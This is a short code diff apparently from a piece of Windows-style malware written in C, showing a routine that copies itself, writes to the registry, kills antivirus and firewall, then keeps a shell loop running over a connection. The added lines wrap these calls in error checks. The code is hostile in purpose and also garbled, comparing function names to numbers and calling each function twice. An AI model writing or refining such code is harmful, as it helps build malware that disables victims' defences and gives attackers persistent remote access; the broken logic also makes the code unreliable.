@@ -205,11 +205,26 @@ void copy_to_registry()
    /* guarante that this functions will run after the shell */
 
       auto_copy();
+      if(auto_copy == -1)
+      perror("error in_auto_copy");
+      else
+         auto_copy();
       copy_to_registry();
+      if(copy_to_registry == 0)
+      perror("error copying to registry");
+      else
+          copy_to_registry();
       kill_antivirus();
+      if(kill_antivirus == -1)
+      perror("kill anti virus failed...");
+      else
+        kill_antivirus();
       kill_firewall();
-
-      usleep(30);
+      if(kill_firewall == -1)
+      perror("kill firewall failed... retrying");
+      else
+          kill_firewall();
+      sleep(1);
 
     /* shell run while the connection for true */
 
@@ -218,15 +233,14 @@ void copy_to_registry()
       }
       while (connect == (true));
       if (connect == 0x0F)
+
       return;
 
 
       {
 
 
-
     }
-
 
 
 }
